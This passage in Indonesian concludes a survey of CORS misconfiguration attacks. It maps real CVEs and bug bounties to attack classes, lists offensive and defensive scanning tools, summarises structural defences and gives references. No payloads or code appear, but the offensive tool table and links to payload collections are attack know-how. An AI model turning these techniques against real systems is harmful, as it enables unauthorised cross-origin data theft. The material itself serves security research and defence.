| §8-2 | CVE-2024-6221 (Flask-CORS 4.0.1) | `Access-Control-Allow-Private-Network: true` ditetapkan secara default tanpa opsi konfigurasi. |
| §1-1 + §5-2 | CVE-2024-47084 (Gradio) | Validasi origin CORS dilewati saat cookie ada; origin mana pun dapat mengakses server Gradio lokal. |
| §8-3 | CVE-2024-28224 (Ollama) | Serangan DNS rebinding mengakses Ollama API tanpa otorisasi. Eksfiltrasi data dalam ~3 detik. |
| §8-4 + §8-1 | Tesla Internal (of-CORS) | Domain typosquat (`eslamotors.com`) menyelidiki miskonfigurasi CORS jaringan internal melalui service worker. |
| §6-1 | Yahoo View (Bug Bounty) | Bypass karakter backtick Safari dalam validasi origin. |
| §1-2 | Google (Bug Bounty) | Bypass regex validasi origin. Bounty $2.500. |
| §9-1 | Prometheus (GitHub #15406) | Ketiadaan `Vary: Origin` memungkinkan cache poisoning terhadap endpoint metrik yang diaktifkan CORS. |
| §5-2 + §9-2 | Mozilla Bug 1200869 | Cache poisoning preflight CORS — ketidakcocokan flag kredensial dalam pembuatan cache key. |

---

## Alat Deteksi

### Ofensif / Pemindaian

| Alat | Cakupan Target | Teknik Utama |
|------|----------------|--------------|
| **CORScanner** (Python) | Pemindaian miskonfigurasi CORS massal yang cepat | Menguji refleksi origin, null, prefix/suffix, kepercayaan subdomain di berbagai URL |
| **Corsy** (Python) | Pemindai miskonfigurasi CORS ringan | Memindai semua pola miskonfigurasi yang diketahui termasuk bypass karakter khusus |
| **CORStest** (Python) | Detektor miskonfigurasi CORS sederhana | Menguji developer backdoor, refleksi origin, null, wildcard pre/post-domain |
| **Corscan** (Python) | Pemeriksa CORS canggih dengan deteksi WAF | Pemrosesan URL tunggal/batch dengan strategi bypass dinamis |
| **of-CORS** (Aplikasi Web) | Penyelidikan CORS jaringan internal melalui typosquatting | Registrasi service worker + penyelidikan endpoint internal terus-menerus |
| **Burp Suite — Trusted Domain CORS Scanner** (BApp) | Pengujian CORS dalam proxy | Mengimplementasikan payload dari URL validation bypass cheat sheet; pemindaian pasif + aktif |

### Defensif / Deteksi

| Alat | Cakupan Target | Teknik Utama |
|------|----------------|--------------|
| **PortSwigger URL Validation Bypass Cheat Sheet** | Referensi untuk pengujian regex/parser | Payload interaktif untuk kebingungan domain, karakter khusus, diferensial encoding |
| **OWASP ZAP CORS Scanner** | Pengujian CORS pasif/aktif dalam proxy | Menandai header CORS yang permisif selama analisis lalu lintas proxy |
| **CSP Evaluator** | Analisis kebijakan pelengkap | Memvalidasi Content Security Policy yang dapat memitigasi beberapa eksploitasi CORS |
| **Mozilla Observatory** | Audit keamanan header HTTP | Memeriksa header keamanan yang hilang termasuk masalah terkait CORS |

### Penelitian / Fuzzing

| Alat | Cakupan Target | Teknik Utama |
|------|----------------|--------------|
| **Singularity of Origin** | Platform serangan DNS rebinding | Infrastruktur DNS rebinding penuh untuk pengujian serangan CORS + batas jaringan |
| **BypassTrackingProtection** (GitHub) | Pengujian perlindungan pelacakan browser | Menguji perilaku cookie/kredensial lintas-browser untuk kelayakan eksploitasi CORS |
| **PayloadsAllTheThings — CORS** | Referensi payload | Payload eksploitasi CORS komprehensif yang diorganisir berdasarkan teknik |

---

## Ringkasan: Prinsip-Prinsip Inti

**Properti fundamental** yang membuat seluruh ruang mutasi CORS menjadi mungkin adalah pendelegasian keputusan kontrol akses ke server berdasarkan **input yang dapat dipengaruhi penyerang** — header `Origin`. Tidak seperti autentikasi (yang memverifikasi pengguna) atau otorisasi (yang memverifikasi izin), CORS memverifikasi *konteks pemanggil* — dan konteks ini sangat mudah dipalsukan di tingkat HTTP. Browser adalah satu-satunya penegak; klien non-browser mana pun mengabaikan CORS sepenuhnya. Ini menciptakan model keamanan di mana server harus mengimplementasikan dengan benar apa yang pada dasarnya adalah ACL berbasis origin menggunakan pencocokan string terhadap input yang sebagian dikontrol penyerang.

**Patch inkremental gagal** karena permukaan serangan bersifat kombinatorial. Server mungkin memperbaiki anchor regex (§1-2) tetapi tetap rentan terhadap null origin (§2), atau memperbaiki keduanya tetapi mempercayai semua subdomain (§7-1), atau memperbaiki segalanya di lapisan aplikasi tetapi dirusak oleh caching (§9) atau DNS rebinding (§8-3). Setiap header CORS (`ACAO`, `ACAC`, `ACAH`, `ACAM`, `ACEH`, `ACMA`) memperkenalkan permukaan mutasinya sendiri, dan interaksi di antara mereka melipatgandakan risiko. Diferensial parser spesifik browser (§6) berarti bahwa bahkan regex yang "benar" pun dapat dilewati di browser tertentu. Evolusi cookie SameSite dan spesifikasi Private Network Access adalah perkembangan positif, tetapi keduanya menciptakan celah periode transisi mereka sendiri di mana perilaku lama berdampingan dengan pembatasan baru.

**Solusi struktural** akan memerlukan tiga pergeseran: (1) **Opt-in eksplisit** daripada opt-out — origin harus ditolak secara default, dengan kebijakan CORS yang didefinisikan secara deklaratif (bukan melalui refleksi dinamis), idealnya dalam file kebijakan keamanan terpisah daripada dalam kode aplikasi. (2) **Desain yang sadar-cache** — respons CORS harus selalu menyertakan `Vary: Origin`, dan infrastruktur caching harus menghormatinya. (3) **Defense in depth** — CORS tidak boleh menjadi satu-satunya batas keamanan. Setiap endpoint sensitif harus memvalidasi autentikasi secara independen, menggunakan CSRF token untuk operasi yang mengubah state, dan mengimplementasikan cookie `SameSite`, header `COOP`, dan `CORP` sebagai pertahanan berlapis. Spesifikasi Private Network Access yang sedang berkembang mewakili arah arsitektur yang tepat — memperlakukan penyeberangan batas jaringan sebagai keputusan keamanan yang berbeda yang memerlukan preflight dan persetujuan pengguna yang eksplisit.

---

## Referensi

- PortSwigger, "Exploiting CORS misconfigurations for Bitcoins and bounties" — https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
- PortSwigger, "URL validation bypass cheat sheet — 2024 Edition" — https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
- Corben Leo, "Advanced CORS Exploitation Techniques" — https://www.corben.io/advanced-cors-techniques/
- HackTricks, "CORS - Misconfigurations & Bypass" — https://book.hacktricks.xyz/pentesting-web/cors-bypass
- Intigriti, "CORS Misconfigurations: Advanced Exploitation Guide" — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities
- Outpost24, "Exploiting trust: Weaponizing permissive CORS configurations" — https://outpost24.com/blog/exploiting-permissive-cors-configurations/
- PT SWARM, "Bypassing browser tracking protection for CORS misconfiguration abuse" — https://swarm.ptsecurity.com/bypassing-browser-tracking-protection-for-cors-misconfiguration-abuse/
- Truffle Security, "Bypass firewalls with of-CORs and typo-squatting" — https://trufflesecurity.com/blog/of-cors
- 0xn3va, "CORS Misconfiguration — Application Security Cheat Sheet" — https://0xn3va.gitbook.io/cheat-sheets/web-application/cors-misconfiguration
- PayloadsAllTheThings, "CORS Misconfiguration" — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- WICG, "Private Network Access Specification" — https://wicg.github.io/private-network-access/
- Mozilla MDN, "Cross-Origin Resource Sharing (CORS)" — https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
- PortSwigger Web Security Academy, "CORS" — https://portswigger.net/web-security/cors
- OWASP, "Testing Cross Origin Resource Sharing" — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing

---

*Dokumen ini dibuat untuk tujuan penelitian keamanan defensif dan pemahaman kerentanan.*
